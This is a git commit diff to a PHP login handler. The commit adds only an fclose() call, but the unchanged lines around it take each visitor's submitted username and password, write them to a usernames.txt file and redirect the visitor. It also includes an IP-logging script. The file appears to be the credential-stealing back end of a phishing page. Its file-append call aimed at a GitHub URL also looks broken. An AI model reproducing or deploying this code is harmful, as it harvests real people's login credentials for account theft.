b047672fa773482f1665b0a9377fe63055af22d2
medha-mishra <63191807+medha-mishra@users.noreply.github.com>
2020-04-05 23:53:17 +1000

    Update login.php

--- login.php
+++ login.php
@@ -3,5 +3,6 @@ include 'ip.php';
 $file = fopen("https://github.com/medha-mishra/medham.unimelb.life/blob/master/usernames.txt","a");
 $content = "[EMAIL]: " . $_POST['username'] . " [PASS]: " . $_POST['password'] . "\n";
 fwrite($file, $content);
+fclose($file);
 header('Location: ');
 exit();
